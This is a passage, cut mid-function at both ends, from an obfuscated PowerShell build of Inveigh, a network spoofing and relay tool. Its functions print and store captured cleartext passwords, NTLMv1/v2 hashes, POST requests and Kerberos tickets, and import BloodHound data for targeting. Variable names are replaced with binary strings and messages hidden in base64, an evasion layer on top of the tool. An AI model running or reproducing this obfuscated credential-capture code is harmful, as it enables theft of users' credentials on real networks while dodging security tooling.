        :console_loop while((${10001101011100010}.relay_running -and ${10001101011100010}.console_output) -or (${10001101011100010}.console_queue.Count -gt 0 -and ${10001101011100010}.console_output))
        {
            while(${10001101011100010}.console_queue.Count -gt 0)
            {
                switch -wildcard (${10001101011100010}.console_queue[0])
                {
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbACEAXQAqAA=='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbAC0AXQAqAA==')))}
                    {
                        if(${10001101011100010}.output_stream_only)
                        {
                            echo(${10001101011100010}.console_queue[0] + ${10001101011100010}.newline)
                        }
                        else
                        {
                            Write-Warning(${10001101011100010}.console_queue[0])
                        }
                        ${10001101011100010}.console_queue.RemoveAt(0)
                    }
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHMAcABvAG8AZgBlAHIAIABpAHMAIABkAGkAcwBhAGIAbABlAGQA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGwAbwBjAGEAbAAgAHIAZQBxAHUAZQBzAHQA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGgAbwBzAHQAIABoAGUAYQBkAGUAcgAgACoA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHUAcwBlAHIAIABhAGcAZQBuAHQAIAByAGUAYwBlAGkAdgBlAGQAIAAqAA==')))}
                    {
                        if($ConsoleOutput -eq 'Y')
                        {
                            if(${10001101011100010}.output_stream_only)
                            {
                                echo(${10001101011100010}.console_queue[0] + ${10001101011100010}.newline)
                            }
                            else
                            {
                                echo(${10001101011100010}.console_queue[0])
                            }
                        }
                        ${10001101011100010}.console_queue.RemoveAt(0)
                    } 
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHIAZQBzAHAAbwBuAHMAZQAgAHMAZQBuAHQA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGkAZwBuAG8AcgBpAG4AZwAgACoA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAEgAVABUAFAAKgByAGUAcQB1AGUAcwB0ACAAZgBvAHIAIAAqAA=='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAFAAcgBvAHgAeQAgAHIAZQBxAHUAZQBzAHQAIABmAG8AcgAgACoA')))}
                    {
                        if($ConsoleOutput -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA'))))
                        {
                            if(${10001101011100010}.output_stream_only)
                            {
                                echo(${10001101011100010}.console_queue[0] + ${10001101011100010}.newline)
                            }
                            else
                            {
                                echo(${10001101011100010}.console_queue[0])
                            }
                        }
                        ${10001101011100010}.console_queue.RemoveAt(0)
                    } 
                    default
                    {
                        if(${10001101011100010}.output_stream_only)
                        {
                            echo(${10001101011100010}.console_queue[0] + ${10001101011100010}.newline)
                        }
                        else
                        {
                            echo(${10001101011100010}.console_queue[0])
                        }
                        ${10001101011100010}.console_queue.RemoveAt(0)
                    }
                }
            }
            if($ConsoleStatus -and ${00001011001000001}.Elapsed -ge ${10010010110010010})
            {
                if(${10001101011100010}.cleartext_list.Count -gt 0)
                {
                    echo("[*] [$(Get-Date -format s)] Current unique cleartext captures:" + ${10001101011100010}.newline)
                    ${10001101011100010}.cleartext_list.Sort()
                    ${10100100100100110} = ${10001101011100010}.POST_request_list
                    foreach(${10000010101100100} in ${10100100100100110})
                    {
                        if($unique_cleartext -ne ${10111010001011011})
                        {
                            echo($unique_cleartext + ${10001101011100010}.newline)
                        }
                        ${10111010001011011} = $unique_cleartext
                    }
                    sleep -m 5
                }
                else
                {
                    echo("[+] [$(Get-Date -format s)] No cleartext credentials have been captured" + ${10001101011100010}.newline)
                }
                if(${10001101011100010}.POST_request_list.Count -gt 0)
                {
                    echo("[*] [$(Get-Date -format s)] Current unique POST request captures:" + ${10001101011100010}.newline)
                    ${10001101011100010}.POST_request_list.Sort()
                    ${10000100000011010} = ${10001101011100010}.NTLMv1_list
                    foreach(${00010111011101011} in ${10000100000011010})
                    {
                        if(${10000010101100100} -ne ${10011011110010010})
                        {
                            echo(${10000010101100100} + ${10001101011100010}.newline)
                        }
                        ${10011011110010010} = ${10000010101100100}
                    }
                    sleep -m 5
                }
                if(${10001101011100010}.NTLMv1_list.Count -gt 0)
                {
                    echo("[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:" + ${10001101011100010}.newline)
                    ${10001101011100010}.NTLMv1_list.Sort()
                    ${11000001110100010} = ${10001101011100010}.NTLMv1_username_list
                    foreach(${00100110011001100} in ${11000001110100010})
                    {
                        ${00000100001111011} = ${00010111011101011}.SubString(0,${00010111011101011}.IndexOf(":",(${00010111011101011}.IndexOf(":") + 2)))
                        if(${00000100001111011} -ne ${01110111100000010})
                        {
                            echo(${00010111011101011} + ${10001101011100010}.newline)
                        }
                        ${01110111100000010} = ${00000100001111011}
                    }
                    ${01110111100000010} = ''
                    sleep -m 5
                    echo("[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:" + ${10001101011100010}.newline)
                    ${11000001110100010} = ${10001101011100010}.NTLMv1_username_list
                    foreach(${00100110011001100} in ${11000001110100010})
                    {
                        echo(${00100110011001100} + ${10001101011100010}.newline)
                    }
                    sleep -m 5
                }
                else
                {
                    echo("[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured" + ${10001101011100010}.newline)
                }
                if(${10001101011100010}.NTLMv2_list.Count -gt 0)
                {
                    echo("[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:" + ${10001101011100010}.newline)
                    ${10001101011100010}.NTLMv2_list.Sort()
                    ${00101001110000100} = ${10001101011100010}.NTLMv2_list
                    foreach(${11000000110011001} in ${00101001110000100})
                    {
                        ${10110101110100010} = ${11000000110011001}.SubString(0,${11000000110011001}.IndexOf(":",(${11000000110011001}.IndexOf(":") + 2)))
                        if(${10110101110100010} -ne ${01100101100000000})
                        {
                            echo(${11000000110011001} + ${10001101011100010}.newline)
                        }
                        ${01100101100000000} = ${10110101110100010}
                    }
                    ${01100101100000000} = ''
                    sleep -m 5
                    echo("[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:" + ${10001101011100010}.newline)
                    ${01000001101100010} = ${10001101011100010}.NTLMv2_username_list
                    foreach(${01000111111100001} in ${01000001101100010})
                    {
                        echo(${01000111111100001} + ${10001101011100010}.newline)
                    }
                }
                else
                {
                    echo("[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured" + ${10001101011100010}.newline)
                }
                ${00001011001000001} = [System.Diagnostics.Stopwatch]::StartNew()
            }
            if(${10001101011100010}.console_input)
            {
                if([Console]::KeyAvailable)
                {
                    ${10001101011100010}.console_output = $false
                    BREAK console_loop
                }
            }
            sleep -m 5
        }
    }
}
finally
{
    if($Tool -eq 2)
    {
        ${10001101011100010}.relay_running = $false
    }
}
}
function Stop-Inveigh
{
    if(${10001101011100010})
    {
        ${10001101011100010}.stop = $true
        if(${10001101011100010}.running -or ${10001101011100010}.relay_running)
        {
            ${10001101011100010}.console_queue.Clear()
            _01011001010001101 -_10101100001011100
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABUAGgAZQByAGUAIABhAHIAZQAgAG4AbwAgAHIAdQBuAG4AaQBuAGcAIABJAG4AdgBlAGkAZwBoACAAZgB1AG4AYwB0AGkAbwBuAHMA')))
        }
    }
}
function Get-Inveigh
{
    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][Switch]$Cleartext,
        [parameter(Mandatory=$false)][Switch]$CleartextUnique,
        [parameter(Mandatory=$false)][Switch]$Console,
        [parameter(Mandatory=$false)][Switch]$ADIDNS,
        [parameter(Mandatory=$false)][Switch]$ADIDNSFailed,
        [parameter(Mandatory=$false)][Int]$KerberosTGT,
        [parameter(Mandatory=$false)][Switch]$KerberosUsername,
        [parameter(Mandatory=$false)][Switch]$Learning,
        [parameter(Mandatory=$false)][Switch]$Log,
        [parameter(Mandatory=$false)][Switch]$NTLMv1,
        [parameter(Mandatory=$false)][Switch]$NTLMv2,
        [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,
        [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,
        [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,
        [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,
        [parameter(Mandatory=$false)][Switch]$POSTRequest,
        [parameter(Mandatory=$false)][Switch]$POSTRequestUnique,
        [parameter(Mandatory=$false)][Switch]$Session,
        [parameter(Mandatory=$false)][Switch]$Enumerate,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )
    if($Console -or $PSBoundParameters.Count -eq 0)
    {
        while(${10001101011100010}.console_queue.Count -gt 0)
        {
            if(${10001101011100010}.output_stream_only)
            {
                echo(${10001101011100010}.console_queue[0] + ${10001101011100010}.newline)
                ${10001101011100010}.console_queue.RemoveAt(0)
            }
            else
            {
                switch -wildcard (${10001101011100010}.console_queue[0])
                {
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbACEAXQAqAA=='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbAC0AXQAqAA==')))}
                    {
                        Write-Warning ${10001101011100010}.console_queue[0]
                        ${10001101011100010}.console_queue.RemoveAt(0)
                    }
                    default
                    {
                        echo ${10001101011100010}.console_queue[0]
                        ${10001101011100010}.console_queue.RemoveAt(0)
                    }
                }
            }
        }
    }
    if($ADIDNS)
    {
        ${01101110000110110} = ${10001101011100010}.ADIDNS_table.Keys
        foreach(${00000111111111101} in ${01101110000110110})
        {
            if(${10001101011100010}.ADIDNS_table.${00000111111111101} -ge 1)
            {
                echo ${00000111111111101}
            }
        }
    }
    if($ADIDNSFailed)
    {
        ${01101110000110110} = ${10001101011100010}.ADIDNS_table.Keys
        foreach(${00000111111111101} in ${01101110000110110})
        {
            if(${10001101011100010}.ADIDNS_table.${00000111111111101} -eq 0)
            {
                echo ${00000111111111101}
            }
        }
    }
    if($KerberosTGT)
    {
        echo ${10001101011100010}.kerberos_TGT_list[$KerberosTGT]
    }
    if($KerberosUsername)
    {
        echo ${10001101011100010}.kerberos_TGT_username_list
    }
    if($Log)
    {
        echo ${10001101011100010}.log
    }
    if($NTLMv1)
    {
        echo ${10001101011100010}.NTLMv1_list
    }
    if($NTLMv1Unique)
    {
        ${10001101011100010}.NTLMv1_list.Sort()
        ${10000100000011010} = ${10001101011100010}.NTLMv1_list
        foreach(${00010111011101011} in ${10000100000011010})
        {
            ${00000100001111011} = ${00010111011101011}.SubString(0,${00010111011101011}.IndexOf(":",(${00010111011101011}.IndexOf(":") + 2)))
            if(${00000100001111011} -ne ${01110111100000010})
            {
                echo ${00010111011101011}
            }
            ${01110111100000010} = ${00000100001111011}
        }
    }
    if($NTLMv1Usernames)
    {
        echo ${10001101011100010}.NTLMv2_username_list
    }
    if($NTLMv2)
    {
        echo ${10001101011100010}.NTLMv2_list
    }
    if($NTLMv2Unique)
    {
        ${10001101011100010}.NTLMv2_list.Sort()
        ${00101001110000100} = ${10001101011100010}.NTLMv2_list
        foreach(${11000000110011001} in ${00101001110000100})
        {
            ${10110101110100010} = ${11000000110011001}.SubString(0,${11000000110011001}.IndexOf(":",(${11000000110011001}.IndexOf(":") + 2)))
            if(${10110101110100010} -ne ${01100101100000000})
            {
                echo ${11000000110011001}
            }
            ${01100101100000000} = ${10110101110100010}
        }
    }
    if($NTLMv2Usernames)
    {
        echo ${10001101011100010}.NTLMv2_username_list
    }
    if($Cleartext)
    {
        echo ${10001101011100010}.cleartext_list
    }
    if($CleartextUnique)
    {
        echo ${10001101011100010}.cleartext_list | gu
    }
    if($POSTRequest)
    {
        echo ${10001101011100010}.POST_request_list
    }
    if($POSTRequestUnique)
    {
        echo ${10001101011100010}.POST_request_list | gu
    }
    if($Learning)
    {
        echo ${10001101011100010}.valid_host_list
    }
    if($Session)
    {
        ${10000101000101100} = 0
        while(${10000101000101100} -lt ${10001101011100010}.session_socket_table.Count)
        {
            if(!${10001101011100010}.session_socket_table[${10000101000101100}].Connected)
            {
                ${10001101011100010}.session[${10000101000101100}] | ? {$_.Status = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAYwBvAG4AbgBlAGMAdABlAGQA')))}
            }
            ${10000101000101100}++
        }
        echo ${10001101011100010}.session | ft -AutoSize
    }
    if($Enumerate)
    {
        echo ${10001101011100010}.enumerate
    }
}
function _01011001010001101
{
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Switch]${_10101100001011100},
    [parameter(Mandatory=$false)][ValidateSet("Low","Medium","Y")][String]$ConsoleOutput = "Y",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)
if(${10001101011100010}.tool -ne 1)
{
    if(${10001101011100010}.running -or ${10001101011100010}.relay_running)
    {
        if(!${_10101100001011100})
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAHIAZQBzAHMAIABhAG4AeQAgAGsAZQB5ACAAdABvACAAcwB0AG8AcAAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAA=')))
        }
        ${10001101011100010}.console_output = $true
        :console_loop while(((${10001101011100010}.running -or ${10001101011100010}.relay_running) -and ${10001101011100010}.console_output) -or (${10001101011100010}.console_queue.Count -gt 0 -and ${10001101011100010}.console_output))
        {
            while(${10001101011100010}.console_queue.Count -gt 0)
            {
                switch -wildcard (${10001101011100010}.console_queue[0])
                {
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbACEAXQAqAA=='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbAC0AXQAqAA==')))}
                    {
                        Write-Warning ${10001101011100010}.console_queue[0]
                        ${10001101011100010}.console_queue.RemoveAt(0)
                    }
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAHAAbwBvAGYAZQByACAAZABpAHMAYQBiAGwAZQBkAF0A'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBsAG8AYwBhAGwAIAByAGUAcQB1AGUAcwB0AF0A'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGgAbwBzAHQAIABoAGUAYQBkAGUAcgAgACoA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHUAcwBlAHIAIABhAGcAZQBuAHQAIAByAGUAYwBlAGkAdgBlAGQAIAAqAA==')))}
                    {
                        if($ConsoleOutput -eq 'Y')
                        {
                            echo ${10001101011100010}.console_queue[0]
                        }
                        ${10001101011100010}.console_queue.RemoveAt(0)
                    } 
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBpAGcAbgBvAHIAaQBuAGcAKgA='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAEgAVABUAFAAKgByAGUAcQB1AGUAcwB0ACAAZgBvAHIAIAAqAA=='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAFAAcgBvAHgAeQAqAHIAZQBxAHUAZQBzAHQAIABmAG8AcgAgACoA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAFkATgAgAHAAYQBjAGsAZQB0ACoA')))}
                    {
                        if($ConsoleOutput -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA'))))
                        {
                            echo ${10001101011100010}.console_queue[0]
                        }
                        ${10001101011100010}.console_queue.RemoveAt(0)
                    } 
                    default
                    {
                        echo ${10001101011100010}.console_queue[0]
                        ${10001101011100010}.console_queue.RemoveAt(0)
                    }
                } 
            }
            if([Console]::KeyAvailable)
            {
                ${10001101011100010}.console_output = $false
                BREAK console_loop
            }
            sleep -m 5
        }
    }
    else
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABJAG4AdgBlAGkAZwBoACAAaQBzAG4AJwB0ACAAcgB1AG4AbgBpAG4AZwA=')))
    }
}
else
{
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABXAGEAdABjAGgALQBJAG4AdgBlAGkAZwBoACAAYwBhAG4AbgBvAHQAIABiAGUAIAB1AHMAZQBkACAAdwBpAHQAaAAgAGMAdQByAHIAZQBuAHQAIABlAHgAdABlAHIAbgBhAGwAIAB0AG8AbwBsACAAcwBlAGwAZQBjAHQAaQBvAG4A')))
}
}
function Clear-Inveigh
{
if(${10001101011100010})
{
    if(!${10001101011100010}.running -and !${10001101011100010}.relay_running)
    {
        rv inveigh -scope global
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABJAG4AdgBlAGkAZwBoACAAZABhAHQAYQAgAGgAYQBzACAAYgBlAGUAbgAgAGMAbABlAGEAcgBlAGQAIABmAHIAbwBtACAAbQBlAG0AbwByAHkA')))
    }
    else
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABSAHUAbgAgAFMAdABvAHAALQBJAG4AdgBlAGkAZwBoACAAYgBlAGYAbwByAGUAIAByAHUAbgBuAGkAbgBnACAAQwBsAGUAYQByAC0ASQBuAHYAZQBpAGcAaAA=')))
    }
}
}
function ConvertTo-Inveigh
{
    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Computers,
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Sessions,
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Groups,
        [parameter(Mandatory=$false)][Switch]$DNS,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )
    if(!$Computers -and !$Sessions -and !$Groups)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBwAGUAYwBpAGYAaQB5ACAAYQAgAEIAbABvAG8AZABIAG8AdQBuAGQAIABjAG8AbQBwAHUAdABlAHIAcwAsACAAZwByAG8AdQBwAHMALAAgAG8AcgAgAHMAZQBzAHMAaQBvAG4AcwAgAEoAUwBPAE4AIABmAGkAbABlAA==')))
        throw
    }
    if(${10001101011100010}.running -or ${10001101011100010}.relay_running)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0ASQBuAHYAZQBpAGcAaAAgAGIAZQBmAG8AcgBlACAAaQBtAHAAbwByAHQAaQBuAGcAIABkAGEAdABhACAAdwBpAHQAaAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASQBuAHYAZQBpAGcAaAA=')))
        throw
    }
    if(!${10001101011100010})
    {
        ${global:10001101011100010} = [HashTable]::Synchronized(@{})
        ${10001101011100010}.cleartext_list = New-Object System.Collections.ArrayList
        ${10001101011100010}.enumerate = New-Object System.Collections.ArrayList
        ${10001101011100010}.IP_capture_list = New-Object System.Collections.ArrayList
        ${10001101011100010}.log = New-Object System.Collections.ArrayList
        ${10001101011100010}.kerberos_TGT_list = New-Object System.Collections.ArrayList
        ${10001101011100010}.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
        ${10001101011100010}.NTLMv1_list = New-Object System.Collections.ArrayList
        ${10001101011100010}.NTLMv1_username_list = New-Object System.Collections.ArrayList
        ${10001101011100010}.NTLMv2_list = New-Object System.Collections.ArrayList
        ${10001101011100010}.NTLMv2_username_list = New-Object System.Collections.ArrayList
        ${10001101011100010}.POST_request_list = New-Object System.Collections.ArrayList
        ${10001101011100010}.valid_host_list = New-Object System.Collections.ArrayList
        ${10001101011100010}.ADIDNS_table = [HashTable]::Synchronized(@{})
        ${10001101011100010}.relay_privilege_table = [HashTable]::Synchronized(@{})
        ${10001101011100010}.relay_failed_login_table = [HashTable]::Synchronized(@{})
        ${10001101011100010}.relay_history_table = [HashTable]::Synchronized(@{})
        ${10001101011100010}.request_table = [HashTable]::Synchronized(@{})
        ${10001101011100010}.session_socket_table = [HashTable]::Synchronized(@{})
        ${10001101011100010}.session_table = [HashTable]::Synchronized(@{})
        ${10001101011100010}.session_message_ID_table = [HashTable]::Synchronized(@{})
        ${10001101011100010}.session_lock_table = [HashTable]::Synchronized(@{})
        ${10001101011100010}.SMB_session_table = [HashTable]::Synchronized(@{})
        ${10001101011100010}.domain_mapping_table = [HashTable]::Synchronized(@{})
        ${10001101011100010}.group_table = [HashTable]::Synchronized(@{})
        ${10001101011100010}.session_count = 0
        ${10001101011100010}.session = @()
    }
    function _00000101010001111
    {
        param (${_01010101101100010},${_00001010101100110},${_10011000100101010},${_10000111000010100},$Sessions,${_00100011111011111},${_10011010010000101},
            ${_00001100111111000},${_00111000111111110},${_10100000011010100},${_10100110000001110},${_01111001100111010},${_10111010111010111},${_01011000111001010},${_01000101110000111},${_01101010001110010},
            ${_10100010110001101},${_00110000101101110},$Enumerate,${_10110111010110100})
        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}
        if(${_00100011111011111} -and ${_00100011111011111} -isnot [Array]){${_00100011111011111} = @(${_00100011111011111})}
        if(${_10011010010000101} -and ${_10011010010000101} -isnot [Array]){${_10011010010000101} = @(${_10011010010000101})}
        if(${_00001100111111000} -and ${_00001100111111000} -isnot [Array]){${_00001100111111000} = @(${_00001100111111000})}
        if(${_00111000111111110} -and ${_00111000111111110} -isnot [Array]){${_00111000111111110} = @(${_00111000111111110})}
        if(${_10100000011010100} -and ${_10100000011010100} -isnot [Array]){${_10100000011010100} = @(${_10100000011010100})}
        if(${_10100110000001110} -and ${_10100110000001110} -isnot [Array]){${_10100110000001110} = @(${_10100110000001110})}
        if(${_01111001100111010} -and ${_01111001100111010} -isnot [Array]){${_01111001100111010} = @(${_01111001100111010})}
        ${00101011001000010} = New-Object PSObject
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGQAZQB4AA=='))) ${10001101011100010}.enumerate.Count
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name "IP" ${_01010101101100010}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))) ${_00001010101100110}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAIABEAG8AbQBhAGkAbgA='))) ${_10011000100101010}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAQgBJAE8AUwAgAEQAbwBtAGEAaQBuAA=='))) ${_10000111000010100}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBzAA=='))) $Sessions
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAFUAcwBlAHIAcwA='))) ${_00100011111011111}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAEcAcgBvAHUAcABzAA=='))) ${_10011010010000101}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAZAA='))) ${_00001100111111000}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAHMA'))) ${_00111000111111110}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgBzAA=='))) ${_10100000011010100}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgBzACAATQBhAHAAcABlAGQA'))) ${_10100110000001110}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAVQBzAGUAcgBzAA=='))) ${_01111001100111010}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA'))) ${_10111010111010111}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBpAG4AZwA='))) ${_01011000111001010}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABTAGUAcgB2AGUAcgA='))) ${_01000101110000111}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAIABSAGUAYwBvAHIAZAA='))) ${_01101010001110010}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAHYANgAgAE8AbgBsAHkA'))) ${_10100010110001101}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAZQBkAA=='))) ${_00110000101101110}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGUA'))) $Enumerate
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA='))) ${_10110111010110100}
        return ${00101011001000010}
    }
    function _01001011111001111([String]${_00001010101100110})
    {
        try
        {
            ${01000100001111101} = [System.Net.Dns]::GetHostEntry(${_00001010101100110})
            foreach(${01000101011101100} in ${01000100001111101}.AddressList)
            {
                if(!${01000101011101100}.IsIPv6LinkLocal)
                {
                    ${_01010101101100010} = ${01000101011101100}.IPAddressToString
                }
            }
        }
        catch
        {
            ${_01010101101100010} = $null
        }
        return ${_01010101101100010}
    }
    function _10010100010101010(${_00101010010111011}) 
    {
        if(${_00101010010111011}.PSObject.TypeNames -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAHIAYQB5AA==')))) 
        {
            return _00111001111011101(${_00101010010111011})
        }
        elseif(${_00101010010111011}.PSObject.TypeNames -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGMAdABpAG8AbgBhAHIAeQA=')))) 
        {
            return _00000101100000010([HashTable]${_00101010010111011})
        }
        else 
        {
            return ${_00101010010111011}
        }
    }
    function _00000101100000010(${_00110010000111101}) 
    {
        ${10010010100101110} = New-Object -TypeName PSCustomObject
        foreach(${01111010101011101} in ${_00110010000111101}.Keys) 
        {
            ${00110111001011101} = ${_00110010000111101}[${01111010101011101}]
            if (${00110111001011101}) 
            {
                ${01100100111110011} = _10010100010101010 ${00110111001011101}
            }
            else 
            {
                ${01100100111110011} = $null
            }
            ${10010010100101110} | Add-Member -MemberType NoteProperty -Name ${01111010101011101} -Value ${01100100111110011}
        }
        return ${10010010100101110}
    }
    function _00111001111011101(${_01010011011010000}) 
    {
        ${10010010100101110} = @()
        ${11000000001111010} = [System.Diagnostics.Stopwatch]::StartNew()
        ${10000101000101100} = 0
        ${_01010011011010000} | % -Process {
            if(${11000000001111010}.Elapsed.TotalMilliseconds -ge 500)
            {
                ${00000100000110010} = [Math]::Truncate(${10000101000101100} / ${_01010011011010000}.count * 100)
                if(${00000100000110010} -le 100)
                {
                    Write-Progress -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBpAG4AZwAgAEoAUwBPAE4A'))) -Status $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMAAwADAAMAAxADAAMAAwADAAMAAxADEAMAAwADEAMAB9ACUAIABDAG8AbQBwAGwAZQB0AGUAOgA='))) -PercentComplete ${00000100000110010} -ErrorAction SilentlyContinue
                }
                ${11000000001111010}.Reset()
                ${11000000001111010}.Start()
            }
            ${10000101000101100}++
            ${10010010100101110} += , (_10010100010101010 $_)}
        return ${10010010100101110}
    }
    function Invoke-ParseJSONString($json) 
    {
        ${10100000111101011} = $javaScriptSerializer.DeserializeObject($json)
        return _00000101100000010 ${10100000111101011}
    }
    [void][System.Reflection.Assembly]::LoadWithPartialName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBXAGUAYgAuAEUAeAB0AGUAbgBzAGkAbwBuAHMA'))))
    if(${10001101011100010}.enumerate.Count -eq 0)
    {
        ${00111110010010001} = $true
    }
    if($Computers)
    {       
